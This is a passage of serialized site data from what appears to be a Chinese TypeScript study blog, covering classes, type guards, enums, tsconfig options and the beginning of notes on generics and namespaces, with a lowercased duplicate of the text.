无法重写覆盖，因为它是父类私有的属性\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n类还有静态属性，上面的都是实例属性，也就是具体实例独享这些属性的值，而静态类型是所有实例共享的属性，甚至可以通过类名来直接使用。\n\nclass Z {\n    static a: string = 'a';\n}\nconst a = Z.a;\n\n\n1\n2\n3\n4\n\n\n静态属性和private修饰符可以搭配使用写一个单例模式\n\nclass Demo {\n    private static _instance: Demo;\n    consrtuctor() { }\n    public static instance(): Demo {\n        return this._instance ? this._instance : new Demo();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n抽象类可以作为其它派生类的基类来使用，和前面的接口很像，但是没有接口的抽象层次高，抽象类可以包含成员的实现细节，那么为了区分抽象类中的抽象方法和普通方法，使用abstract关键字定义抽象方法（抽象类本身也使用这个关键字）。\n\nabstract class Ademo {\n    public move() { }\n    abstract say(); // 待实现的抽象方法\n}\n\n\n1\n2\n3\n4\n\n\n\n# 联合类型和类型保护\n\n在给变量做类型注解时可以使用联合类型，比如let a: string | number意思是a变量可能是字符串类型也可能是数值类型，当然它也可以用于复杂类型，在使用时只能使用联合类型的共有属性。\n\ninterface Ia { name: string; fun1: () => string; }\ninterface Ib { name: string; fun2: () => string; }\n(val: Ia | Ib) => {\n    val.name; // 只能使用name属性，fun1和fun2就使用不了\n}\n\n\n1\n2\n3\n4\n5\n\n\n解决上面的问题可以使用类型保护，比如其中一种是类型断言：\n\ninterface Ia { name: string; fun1: () => string; }\ninterface Ib { name: string; fun2: () => string; }\n(val: Ia | Ib) => {\n    (val as Ia).fun1; // 断言成Ia类型，然后就可以使用fun1\n}\n\n\n1\n2\n3\n4\n5\n\n\n还可以使用in操作符：\n\ninterface Ia { name: string; fun1: () => string; }\ninterface Ib { name: string; fun2: () => string; }\n(val: Ia | Ib) => {\n    if ('fun1' in val)\n        val.fun1; // 存在这个方法就能使用\n    else if ('fun2' in val)\n        val.fun2;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n还可以使用typeof和instanceof操作符：\n\n// typeof\n(a: number | string, b: number | string) => {\n    if (typeof (a) === 'string' || typeof (b) === 'string')\n        return `${a}${b}`\n    else\n        return a + b;\n}\n// instanceof（只能用在class，不能用在interface）\nclass A { name: string; fun: () => string; }\nclass B { fun: () => string; }\n(v1: A | B, v2: A | B) => {\n    if (v1 instanceof A && v2 instanceof A)\n        `${v1.name}${v2.name}`\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 枚举类型\n\n枚举就是一种可以一一列举出它所有值的一种类型，常用于一些判断语句与常量的搭配使用中。\n\nenum Status { // 定义一个枚举类型\n    START = 0, // 不赋值0也是默认0\n    PENDDING, // 如果这里赋值6，那么END值就会是7，而START还是0\n    END,\n}\n((status: Status) => { // 入参的类型注解就是枚举类型\n    if (status === Status.START) { // 枚举的正向使用\n        console.log(Status[0]); // 枚举的正向使用\n    } else if (status === Status.PENDDING) {\n        console.log(Status[1]);\n    } else if (status === Status.END) {\n        console.log(Status[2]);\n    }\n})(0); // 传的值可以是Status.START也可以直接是0\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n上面的例子就是枚举怎么定义和怎么使用。枚举本身是从0开始逐渐往后增加，也可以直接给第一项指定初始值，那枚举所有项都是从第一个值往后增加。其实枚举的值除了是数值以外也可以是字符串，但不会有数值自增的性质，必须每项都用字符串（其实数值和字符串混合也可以但不太建议）。\n\nenum Status { // 定义一个枚举类型\n    START = 'START',\n    PENDDING = 'PENDDING',\n    END = 'END',\n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# tsconfig.json\n\ntsconfig.json是ts的编译配置文件，也包含一些静态检查。\n\ntsc xxx.ts指定了对单个文件的编译，暂时不会用到tsconfig.json，会使用默认的配置项；而tsc不指定文件，就会去根目录里搜索tsconfig.json，并使用其中的配置项进行编译。\n\n指定文件可以使用\"include\"和\"exclude\"配置项，比如只编译主要文件，忽略node模块和测试文件：\n\n\"include\": [\n    \"src/**/*\"\n],\n\"exclude\": [\n    \"node_modules\",\n    \"**/*.spec.ts\"\n]\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\"compilerOptions\"是编译选项，常用的：\n\n * target：指定ECMAScript目标版本 \"ES3\"（默认）， \"ES5\"， \"ES6\"/ \"ES2015\"， \"ES2016\"， \"ES2017\"或 \"ESNext\"。\n * module：指定生成哪个模块系统代码： \"None\"， \"CommonJS\"， \"AMD\"， \"System\"， \"UMD\"， \"ES6\"或 \"ES2015\"。\n * lib：编译过程中需要引入的库文件的列表。比如值是[\"es2017\", \"DOM\"]，需要引入es2017和dom模块。\n * outDir：重定向输出目录。编译输出目录。\n * strict：启用所有严格类型检查选项。当于启用noImplicitAny、noImplicitThis、alwaysStrict、strictNullChecks、strictFunctionTypes、strictPropertyInitialization。\n * noImplicitAny：在表达式和声明上有隐含的 any类型时报错。\n * noImplicitThis：当 this表达式的值为 any类型的时候，生成一个错误。\n * alwaysStrict：以严格模式解析并为每个源文件生成 \"use strict\"语句。\n * esModuleInterop：通过为所有导入创建命名空间对象，实现CommonJS和ES模块之间的互操作性。\n * noUnusedLocals：若有未使用的局部变量则抛错。\n * noUnusedParameters：若有未使用的参数则抛错。\n * noImplicitReturns：不是函数的所有返回路径都有返回值时报错。\n * removeComments：删除所有注释，除了以 /!*开头的版权信息。\n\n可以考虑使用的：\n\n * rootDir：仅用来控制输出的目录结构 --outDir。\n * outFile：把编译输出文件放到一个文件里。\n * incremental：是否启用增量编译。\n * allowJs：允许编译javascript文件。\n * checkJs：在 .js文件中报告错误。与 --allowJs配合使用。\n * sourceMap：调试文件，相关的有inlineSourceMap还有mapRoot。\n * baseUrl：根路径。\n\n与react有关的可以看一下学习react的准备工作",normalizedContent:"# typescript基础\n\n\n# 静态类型的理解\n\n当变量的类型确定下来时，变量的类型在后面是无法修改的，还有一点就是该变量可以使用该类型上的所有公共方法和公共属性。\n\nconst num: number = 1.2; // 后面无法修改到其他类型\nnum.tofixed(0);          // 可以使用数值类型上的tofixed方法，保留0位小数\n\n\n1\n2\n\n\n\n# 基础和复杂类型\n\n因为ts是js的超集，所以js的类型都存在于ts里。基础类型有null、undefined、number、boolean、string、symbol，也叫简单类型。而复杂类型是由object为代表的，它有一些子类，比如array、function和自定义的复杂类型。\n\nconst num: number = 1;          // number\nconst str: string = 'a';        // string\nconst bool: boolean = false;    // boolean\nconst person: { name: string, age: number } = { name: 'bob', age: 25 }; // 自定义的复杂类型（也是对象类型）\n\n\n1\n2\n3\n4\n\n\n\n# 类型注解和类型推断\n\n**类型注解(type annotation)**声明变量时，给变量做的类型约束，是为了告诉ts和开发者该变量是个什么类型。\n\n**类型推断(type inference)**如果声明的变量不给做类型注解，那么ts会根据你赋的值来推断它是个什么类型。\n\nconst num: number = 1;  // 其中: number就是类型注解\nconst str = 'a';        // 会根据'a'推断出str是一个string类型\n\n\n1\n2\n\n\n如果定义的是常量并且使用的是基本类型的值，那就可以不用做类型注解。像上面的num就可以省略：const num = 1;。\n\n在方法中传参就得做类型注解，即使你传的是基本类型，因为ts无法推测你的方法应该传什么，可能永远都不会调用所以它推不出来，而方法的会返回值可以通过return的类型来推测，所以方法的返回接收值可以不用做类型注解。\n\n\n# 函数\n\n函数function是基于object的，它主要用于描述一类行为，执行一些特定的代码，可以参考查看js里的function类型。\n\n * 一般的，函数的入参是要做类型注解的。因为ts没有根据去推测函数入参的类型的，它的调用处是多样性的，所以必须给函数入参做严格限制，才能保证不影响到函数内部的一些执行。\n\n * 而函数的返回值可以不用做类型注解，因为可以依赖于return来推测，但是函数没有return时又偏偏后期某个时间点给它加上了return，这会影响到所有的调用点，那最好还是给函数的返回值做注解。具体是有return就做具体类型注解，没有return需求就使用void做类型注解。\n   \n   function demo(data: { x: number, y: number }) { // x,y必须做类型注解\n       const x = number(data.x.tofixed(1));\n       return x + data.y;\n   }\n   const result = demo({ x: 1.2, y: 2 });          // result可以不用做类型注解\n   \n   \n   1\n   2\n   3\n   4\n   5\n   \n\n * 有个经常犯错的场景，就是函数的参数使用解构语法，很容易把对象解构和类型注解混在一个对象里写。下面这个示例与上面一点里的示例非常像，其实你仔细看后面的类型注解一模一样的，只是前面的data换成了解构写法而已。\n   \n   // 入参千万别只写个{ x: number, y: number }就完事了，前面要加上{ x, y }:\n   function demo({ x, y }: { x: number, y: number }): void { // 没有返回值，函数返回类型注解为void\n       console.log(x + y);\n   }\n   demo({ x: 1.2, y: 2 });\n   \n   \n   1\n   2\n   3\n   4\n   5\n   \n\n * 还有函数类型本身的一个注解，可以使用(入参注解) => 返回值注解，也可以直接使用function，不过还是推荐使用interface来约束函数类型，下面小节里会讲。\n   \n   const func: (x: number, y:number) => string = (x: number, y: number): string => {\n       return (x + y).tostring();\n   };\n   const func1: function = (x: number, y: number): string => { // function也可以，其实上一种更具约束力\n       return (x + y).tostring();\n   };\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   \n\n总的来说，函数入参的类型注解一定要做并且要区分普通的和解构的，然后函数的返回值也要做类型注解用来约束函数的返回值。\n\n\n# 数组和元组\n\n我们知道js的数组是可以存不同类型的值，数组的长度也是动态改变的，详情可以查看js的array类型。\n\n而ts的数组会有限制，可以限定你的数组里的元素只能是哪些类型。ts还有一个元组，它的限定等级更高，它首先限定数组的元素数量再限定具体位置上是什么类型的元素。\n\n// 数组\nconst arr1: number[] = [1, 2, 3, 4];\nconst arr2: array<number> = [1, 2, 3, 4];           // 数组配合泛型使用\nconst arr3: (number | string)[] = [1, 2, '3', 4];   // 数组配合联合类型使用\n// 其实可以使用数组配合泛型（array<t>）替代这个复杂写法\nconst arr4: { name: string, age: number }[] = [{ name: 'sandy', age: 15 }, { name: 'marry', age: 18 }];\n// 元组\nconst arr5: [string, string, number] = ['1', '2', 3];\n// 数据简单属性少就可以用元组替代对象数组（array<t>），因为它约束更强，就是一个位置一个位置约定还是很麻烦的\nconst arr6: [string, string, number][] = [['sandy', 'student', 15], ['marry', 'student', 18]];\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 接口\n\n在其他语言里接口是给具有类似行为或属性的事物制作一个顶级的模板，用于约束这一类事物，里面有抽象的属性和方法而并不实现它们。\n\njs没有接口，而ts引进了接口。作用和其他语言类似也是为了约束一类事物，但由于js的缘故，ts的接口使用起来更灵活。\n\n\n# 接口约束对象\n\n接口可以约束普通的对象，跟普通的class写法类似，但是它只能书写抽象的属性和方法，也就是说不能为它们进行赋值（不能立马实现）。\n\ninterface idata {           // 接口来约束对象\n    name: string;           // 必填属性\n    readonly age: number;   // 只读属性\n    email?: string;         // 可选属性\n}\nfunction dosome(person: idata): string {\n    return person.name;\n}\nfunction dosome1(person: idata): string {\n    return person.name + person.age.tostring();\n}\nconst person = { name: 'sandy', age: 15, email: 'ss@qq.com', profession: 'student' };\ndosome(person);                    // 传的是对象指针，不会做强校验，也就说参数可以多但不能少\ndosome1({ name: 'bob', age: 19 }); // 传的是对象字面量，会对它做强校验，不符合就会报错\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n除了上面的这些用法，还可以往接口里加函数方法，能对函数方法进行约束，同样的也不能对它进行具体的实现。\n\ninterface idata {\n    name: string;           // 必填属性\n    readonly age: number;   // 只读属性\n    email?: string;         // 可选属性\n    sayage(): number;       // 方法，返回值必须是规定类型的，不然会报错\n}\nfunction dosome(person: idata): void {\n    console.log(person.sayage());\n}\nconst person = {\n    name: 'sandy',\n    age: 15,\n    email: 'ss@qq.com',\n    profession: 'student',\n    sayage: () => { return person.age } // 必须同接口里的一样定义相同的返回值\n};\ndosome(person); // 传的是对象指针person，不会做强校验，也就是参数可以多但是不能少\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# 接口的实现与继承\n\n除了上述这种直接用于对象的约束，接口当然也能像传统接口的一样使用类来implements（实现）\n\ninterface idata {\n    name: string;           // 必填属性\n    readonly age: number;   // 只读属性\n    email?: string;         // 可选属性\n    sayage(): number;       // 方法，返回值必须是规定类型的，不然会报错\n}\nclass person implements idata {\n    name: string;           // 必填属性\n    readonly age: number;   // 只读属性\n    email?: string;         // 可选属性\n    constructor() { }       // 构造函数\n    sayage = (): number => { return this.age } // 方法，返回值必须是规定的，不然报错\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n接口也能继承接口\n\ninterface idata {\n    name: string;           // 必填属性\n    readonly age: number;   // 只读属性\n    email?: string;         // 可选属性\n    sayage(): number;       // 方法，返回值必须是规定类型的，不然会报错\n}\ninterface iperson extends idata {\n    sayname(): string;      // 新增方法\n}\nclass person implements iperson {\n    name: string;           // 必填属性\n    readonly age: number;   // 只读属性\n    email?: string;         // 可选属性\n    constructor() { }       // 构造函数\n    sayage = (): number => { return this.age }   // 方法，返回值必须是规定的，不然报错\n    sayname = (): string => { return this.name };// 方法，返回值必须是规定的，不然报错\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# 接口约束函数\n\n接口可以约束一个函数对象，函数对象本来就是继承自object，只是接口是对函数的入参和出参进行约束的（忽略方法体），而对象是对对象的属性进行约束的（忽略属性值）。但只要记住接口的写法都是类似于class的，不管它约束谁。\n\n比如下面这个是函数类型注解的一种改造：\n\ninterface ifunc {\n    (x: number, y: number): string;\n}\nconst func: ifunc = (x: number, y: number): string => {\n    return (x + y).tostring();\n};\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 接口约束数组\n\n数组除了可以(number | string)[]，或者[string, number, string]进行类型注解，也可以配合接口对数组进行类型注解。\n\ninterface iarr {\n    [index: number]: string;\n}\nconst arr: iarr = ['1', '2', '3'];\n\n\n1\n2\n3\n4\n\n\n\n# 类\n\nes6之前都是使用原型链来实现继承（甚至要配合构造函数和call）会比较麻烦，es6推出了class方式的继承，同样的ts也能使用class方式继承。\n\nclass x {\n    a: string = 'a';                    // 公共属性（都可访问）\n    public b: string = 'b';             // 公共属性（都可访问）\n    protected c: string = 'c';          // 受保护属性（自己和子类可访问）\n    private _d: string = 'd';           // 私有属性（只有自己可访问）\n    get d(): string { return this._d; } // 通过暴露的方法来间接操作私有属性\n    set d(d: string) { this._d = d; }   // 通过暴露的方法来间接操作私有属性\n    constructor() { }                   // 构造函数\n    funca() { }                         // 公共方法\n    public funcb() { }                  // 公共方法\n    protected funcc() { }               // 受保护方法（自己和子类可访问）\n    private funcd() { }                 // 私有方法（只有自己可访问）\n}\nclass y extends x {                     // 继承一个，可以继承到受保护的和公共方法\n    a: string = 'a';                    // 重写覆盖\n    public b: string = 'b';             // 重写覆盖\n    protected c: string = 'c';          // 重写覆盖\n    // private _d: string  = 'd';       // 无法重写覆盖，因为它是父类私有的属性\n    constructor() { super(); }          // 构造函数必须第一行就调用super();\n    funca() { }                         // 重写覆盖\n    public funcb() { }                  // 重写覆盖\n    protected funcc() { }               // 重写覆盖\n    // private funcd() { }              // 无法重写覆盖，因为它是父类私有的属性\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n类还有静态属性，上面的都是实例属性，也就是具体实例独享这些属性的值，而静态类型是所有实例共享的属性，甚至可以通过类名来直接使用。\n\nclass z {\n    static a: string = 'a';\n}\nconst a = z.a;\n\n\n1\n2\n3\n4\n\n\n静态属性和private修饰符可以搭配使用写一个单例模式\n\nclass demo {\n    private static _instance: demo;\n    consrtuctor() { }\n    public static instance(): demo {\n        return this._instance ? this._instance : new demo();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n抽象类可以作为其它派生类的基类来使用，和前面的接口很像，但是没有接口的抽象层次高，抽象类可以包含成员的实现细节，那么为了区分抽象类中的抽象方法和普通方法，使用abstract关键字定义抽象方法（抽象类本身也使用这个关键字）。\n\nabstract class ademo {\n    public move() { }\n    abstract say(); // 待实现的抽象方法\n}\n\n\n1\n2\n3\n4\n\n\n\n# 联合类型和类型保护\n\n在给变量做类型注解时可以使用联合类型，比如let a: string | number意思是a变量可能是字符串类型也可能是数值类型，当然它也可以用于复杂类型，在使用时只能使用联合类型的共有属性。\n\ninterface ia { name: string; fun1: () => string; }\ninterface ib { name: string; fun2: () => string; }\n(val: ia | ib) => {\n    val.name; // 只能使用name属性，fun1和fun2就使用不了\n}\n\n\n1\n2\n3\n4\n5\n\n\n解决上面的问题可以使用类型保护，比如其中一种是类型断言：\n\ninterface ia { name: string; fun1: () => string; }\ninterface ib { name: string; fun2: () => string; }\n(val: ia | ib) => {\n    (val as ia).fun1; // 断言成ia类型，然后就可以使用fun1\n}\n\n\n1\n2\n3\n4\n5\n\n\n还可以使用in操作符：\n\ninterface ia { name: string; fun1: () => string; }\ninterface ib { name: string; fun2: () => string; }\n(val: ia | ib) => {\n    if ('fun1' in val)\n        val.fun1; // 存在这个方法就能使用\n    else if ('fun2' in val)\n        val.fun2;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n还可以使用typeof和instanceof操作符：\n\n// typeof\n(a: number | string, b: number | string) => {\n    if (typeof (a) === 'string' || typeof (b) === 'string')\n        return `${a}${b}`\n    else\n        return a + b;\n}\n// instanceof（只能用在class，不能用在interface）\nclass a { name: string; fun: () => string; }\nclass b { fun: () => string; }\n(v1: a | b, v2: a | b) => {\n    if (v1 instanceof a && v2 instanceof a)\n        `${v1.name}${v2.name}`\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 枚举类型\n\n枚举就是一种可以一一列举出它所有值的一种类型，常用于一些判断语句与常量的搭配使用中。\n\nenum status { // 定义一个枚举类型\n    start = 0, // 不赋值0也是默认0\n    pendding, // 如果这里赋值6，那么end值就会是7，而start还是0\n    end,\n}\n((status: status) => { // 入参的类型注解就是枚举类型\n    if (status === status.start) { // 枚举的正向使用\n        console.log(status[0]); // 枚举的正向使用\n    } else if (status === status.pendding) {\n        console.log(status[1]);\n    } else if (status === status.end) {\n        console.log(status[2]);\n    }\n})(0); // 传的值可以是status.start也可以直接是0\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n上面的例子就是枚举怎么定义和怎么使用。枚举本身是从0开始逐渐往后增加，也可以直接给第一项指定初始值，那枚举所有项都是从第一个值往后增加。其实枚举的值除了是数值以外也可以是字符串，但不会有数值自增的性质，必须每项都用字符串（其实数值和字符串混合也可以但不太建议）。\n\nenum status { // 定义一个枚举类型\n    start = 'start',\n    pendding = 'pendding',\n    end = 'end',\n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# tsconfig.json\n\ntsconfig.json是ts的编译配置文件，也包含一些静态检查。\n\ntsc xxx.ts指定了对单个文件的编译，暂时不会用到tsconfig.json，会使用默认的配置项；而tsc不指定文件，就会去根目录里搜索tsconfig.json，并使用其中的配置项进行编译。\n\n指定文件可以使用\"include\"和\"exclude\"配置项，比如只编译主要文件，忽略node模块和测试文件：\n\n\"include\": [\n    \"src/**/*\"\n],\n\"exclude\": [\n    \"node_modules\",\n    \"**/*.spec.ts\"\n]\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\"compileroptions\"是编译选项，常用的：\n\n * target：指定ecmascript目标版本 \"es3\"（默认）， \"es5\"， \"es6\"/ \"es2015\"， \"es2016\"， \"es2017\"或 \"esnext\"。\n * module：指定生成哪个模块系统代码： \"none\"， \"commonjs\"， \"amd\"， \"system\"， \"umd\"， \"es6\"或 \"es2015\"。\n * lib：编译过程中需要引入的库文件的列表。比如值是[\"es2017\", \"dom\"]，需要引入es2017和dom模块。\n * outdir：重定向输出目录。编译输出目录。\n * strict：启用所有严格类型检查选项。当于启用noimplicitany、noimplicitthis、alwaysstrict、strictnullchecks、strictfunctiontypes、strictpropertyinitialization。\n * noimplicitany：在表达式和声明上有隐含的 any类型时报错。\n * noimplicitthis：当 this表达式的值为 any类型的时候，生成一个错误。\n * alwaysstrict：以严格模式解析并为每个源文件生成 \"use strict\"语句。\n * esmoduleinterop：通过为所有导入创建命名空间对象，实现commonjs和es模块之间的互操作性。\n * nounusedlocals：若有未使用的局部变量则抛错。\n * nounusedparameters：若有未使用的参数则抛错。\n * noimplicitreturns：不是函数的所有返回路径都有返回值时报错。\n * removecomments：删除所有注释，除了以 /!*开头的版权信息。\n\n可以考虑使用的：\n\n * rootdir：仅用来控制输出的目录结构 --outdir。\n * outfile：把编译输出文件放到一个文件里。\n * incremental：是否启用增量编译。\n * allowjs：允许编译javascript文件。\n * checkjs：在 .js文件中报告错误。与 --allowjs配合使用。\n * sourcemap：调试文件，相关的有inlinesourcemap还有maproot。\n * baseurl：根路径。\n\n与react有关的可以看一下学习react的准备工作",charsets:{cjk:!0}},{title:"2.typescript进阶",frontmatter:{title:"2.typescript进阶"},regularPath:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0TypeScript/2.typescript%E8%BF%9B%E9%98%B6.html",relativePath:"book-web/html、css、js、ts/学习TypeScript/2.typescript进阶.md",key:"v-6cd41a4a",path:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0TypeScript/2.typescript%E8%BF%9B%E9%98%B6.html",headers:[{level:2,title:"泛型",slug:"泛型",normalizedTitle:"泛型",charIndex:19},{level:3,title:"泛型接口",slug:"泛型接口",normalizedTitle:"泛型接口",charIndex:127},{level:3,title:"泛型类",slug:"泛型类",normalizedTitle:"泛型类",charIndex:187},{level:3,title:"泛型函数",slug:"泛型函数",normalizedTitle:"泛型函数",charIndex:190},{level:3,title:"泛型约束",slug:"泛型约束",normalizedTitle:"泛型约束",charIndex:900},{level:3,title:"泛型中的keyof",slug:"泛型中的keyof",normalizedTitle:"泛型中的keyof",charIndex:1365},{level:2,title:"命名空间",slug:"命名空间",normalizedTitle:"命名空间",charIndex:1953},{level:3,title:"命名空间声明",slug:"命名空间声明",normalizedTitle:"命名空间声明",charIndex:1962},{level:3,title:"命名空间使用",slug:"命名空间使用",normalizedTitle:"命名空间使用",charIndex:2041},{level:3,title:"命名空间里再定义命名空间",slug:"命名空间里再定义命名空间",normalizedTitle:"命名空间里再定义命名空间",charIndex:3072},{level:2,title:"import",slug:"import",normalizedTitle:"import",charIndex:3347},{level:3,title:"配合require.js使用",slug:"配合require-js使用",normalizedTitle:"配合require.js使用",charIndex:3358},{level:3,title:"使用webpack打包",slug:"使用webpack打包",normalizedTitle:"使用webpack打包",charIndex:4198},{level:2,title:"编写*.d.ts文件",slug:"编写-d-ts文件",normalizedTitle:"编写*.d.ts文件",charIndex:7962},{level:3,title:"声明全局函数",slug:"声明全局函数",normalizedTitle:"声明全局函数",charIndex:8105},{level:3,title:"搭配使用interface",slug:"搭配使用interface",normalizedTitle:"搭配使用interface",charIndex:8668},{level:3,title:"声明对象和类",slug:"声明对象和类",normalizedTitle:"声明对象和类",charIndex:9116},{level:3,title:"es6模块的声明文件",slug:"es6模块的声明文件",normalizedTitle:"es6模块的声明文件",charIndex:9738},{level:2,title:"装饰器",slug:"装饰器",normalizedTitle:"装饰器",charIndex:10595},{level:3,title:"对类装饰",slug:"对类装饰",normalizedTitle:"对类装饰",charIndex:11272},{level:3,title:"对方法装饰",slug:"对方法装饰",normalizedTitle:"对方法装饰",charIndex:13032},{level:3,title:"对访问器装饰",slug:"对访问器装饰",normalizedTitle:"对访问器装饰",charIndex:13728},{level:3,title:"对属性装饰",slug:"对属性装饰",normalizedTitle:"对属性装饰",charIndex:14412},{level:3,title:"对参数装饰",slug:"对参数装饰",normalizedTitle:"对参数装饰",charIndex:15001},{level:3,title:"装饰器的小例子",slug:"装饰器的小例子",normalizedTitle:"装饰器的小例子",charIndex:15477}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"泛型 泛型接口 泛型类 泛型函数 泛型约束 泛型中的keyof 命名空间 命名空间声明 命名空间使用 命名空间里再定义命名空间 import 配合require.js使用 使用webpack打包 编写*.d.ts文件 声明全局函数 搭配使用interface 声明对象和类 es6模块的声明文件 装饰器 对类装饰 对方法装饰 对访问器装饰 对属性装饰 对参数装饰 装饰器的小例子",content:"# typescript进阶\n\n\n# 泛型\n\n泛型可以说一个泛指类型，在程序时并不清楚它具体是哪一个类型，这段程序被调用时才会给它指定具体类型。泛型定义时常使用<T>，当然使用<A>也可以；在泛型调用就得给它指定具体的类型比如<string>。\n\n\n# 泛型接口\n\n泛型接口中<T>常跟在接口名后面，一般调用处要指定具体类型。泛型可以一次使用多个，不止是泛型接口，下面的比如泛型类泛型函数等都可以使用多个泛型。\n\ninterface ITask<T, P> {\n    name: T;\n    age: P;\n}\nconst task: ITask<string, number> = { name: 'Bob', age: 20 };\n\n\n1\n2\n3\n4\n5\n\n\n\n# 泛型类\n\n泛型类中<T>常跟在类名后面，一般调用处要指定具体类型。\n\nclass Data<T> {\n    constructor(private _item: T) { }\n    get item(): T { return this._item; }\n}\nconst data: Data<number> = new Data<number>(0);\n\n\n1\n2\n3\n4\n5\n\n\n\n# 泛型函数\n\n泛型函数中<T>常跟在函数名后面，一般调用处要指定具体类型。含有可以给一个变量类型注解为泛型函数，一般有两种，一种是花括号和冒号搭配，另一种是不用花括号而使用箭头函数。\n\nfunction fun<T>(v1: T, v2: T) {\n    console.log(`${v1}+${v2}`);\n}\nfun<string>('web', 'app');                     // 调用时加上<string>具体的限制类型\nconst func: { <T>(v1: T, v2: T): void } = fun; // 定义一个泛型函数\nconst func1: <T>(v1: T, v2: T) => void = fun;  // 定义一个泛型函数\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 泛型约束\n\n泛型还可以和extends搭配使用，表示该泛型受到约束\n\ninterface Itest { name: string; }\nclass Data<T extends Itest> {\n    constructor(private _item: T) { }\n    get item(): T { return this._item; }\n}\nconst data = new Data({ name: 'Bob' });\n\n\n1\n2\n3\n4\n5\n6\n\n\n继承接口、类、基本类型都可以\n\n// 使用基本类型的联合类型来约束泛型\nclass Data<T extends number | string> {\n    constructor(private _item: T) { }\n    get item(): T { return this._item; }\n}\nconst data: Data<number | string> = new Data('Bob');\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 泛型中的keyof\n\n在程序中使用一个泛型，一般都是直接用它本身，但难免不会去操作它的属性，如果它属性的类型各不相同，在外部调用这段程序时ts可能就不会做具体的类型推断了。使用keyof可以分解一个复杂类型，获取它属性上的各种类型。\n\ninterface Task {\n    num: number;\n    name: string;\n    desc: string;\n}\nclass AcceptTask {\n    constructor(private _task: Task) { }\n    // 需要根据key去取_task的属性里，key对应的值，但是_task的属性的类型都不一样\n    // 所以可以使用keyof对Task进行分解，key就可以拿到属性的各种可能的情况\n    public notify<T extends keyof Task>(key: T): Task[T] {\n        return this._task[key];\n    }\n}\nconst status = new AcceptTask({ num: 1001, name: 'task1', desc: 'xxx' });\nstatus.notify('name');\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# 命名空间\n\n\n# 命名空间声明\n\n命名空间（对应在es6里叫“内部模块”）可以将一些类或者函数等包裹起来，使用模块化的方式来组织代码，减少类或函数等在全局环境中暴露的机会。\n\n命名空间使用namespace来声明的，并且还可以和export搭配使用，可以让命名空间内的一部分内容让外部使用。\n\nview.ts\n\nnamespace ViewSpace {\n    class A { }\n    class B { }\n    export class C { // 将C暴露给命名空间之外，外部就可以使用TaskSpace.C了\n        constructor() {\n            new A();\n            new B();\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 命名空间使用\n\n在一个namespace中调用另一个namespace，并且还要放在页面中，那么先使用tsc进行编译生成对应的js文件，然后每一个js文件都要用一个<script>存放，最后就可以在<script>中使用了。\n\nbox.ts\n\n///<reference path='./view.ts'>\nnamespace BoxSpace {\n    export class D {\n        constructor() {\n            new ViewSpace.C();\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nh.html\n\n<html>\n    <head>\n        <script src=\"./dist/view.js\"><\/script>\n        <script src=\"./dist/box.js\"><\/script>\n    </head>\n    <body>\n        <script>\n            new BoxSpace.D();\n        <\/script>\n    </body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n其实可以将编译文件生成在一起，先不考虑使用webpack，ts可以自己配置编译生成一个js。打开tsconfig.json，将module修改为amd，然后加上\"outFile\": \"./dist/bundle.js\"。这样就只引用bundle.js就可以了。\n\n注意：像以上命名空间相互引用的写法，最好要加上“声明”，例如///<reference path='./view.ts'>\n\n\n# 命名空间里再定义命名空间\n\n///<reference path='./view.ts'>\nnamespace BoxSpace {\n    export namespace ButtonSpace{ // 命名空间里再定义命名空间\n        export class E { }\n    }\n    export class D {\n        constructor() {\n            new ViewSpace.C();\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# import\n\n\n# 配合require.js使用\n\n其实命名空间使用的不多，主要还是使用import方式。跟上一节样，先不考虑使用webpack，还是使用\"module\": \"amd\"和\"outFile\": \"./dist/bundle.js\"，但在页面使用时会有问题define识别不了，得引require.js进来（用cdn形式）。然后在脚本中使用require的方式实例化D，代码示例如下：\n\nview.ts\n\nclass A { }\nclass B { }\nexport class C {\n    constructor() {\n        new A();\n        new B();\n        console.log('C');\n    